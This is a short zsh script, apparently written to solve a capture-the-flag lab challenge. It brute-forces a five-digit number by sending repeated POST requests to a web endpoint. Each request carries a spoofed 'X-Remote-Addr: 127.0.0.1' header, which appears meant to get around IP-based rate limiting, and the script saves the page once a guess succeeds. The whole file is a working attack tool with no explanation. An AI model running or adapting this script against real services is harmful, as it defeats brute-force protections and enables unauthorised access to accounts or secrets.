#!/bin/zsh

url="10.10.172.144:8085/home"

for i in {10000..99999}; do
    echo -n "--> $url&number=$i "
    checker=`curl -X POST $url -d "number=$i" -H "X-Remote-Addr: 127.0.0.1" --silent`

    if [[ $checker =~ "Oh no!" ]]; then
        echo "Wrong guess"
    else
        echo "lucky number is: $i"
        curl -X POST $url -d "number=$i" -H "X-Remote-Addr: 127.0.0.1" --silent > answer.html
        exit
    fi
done


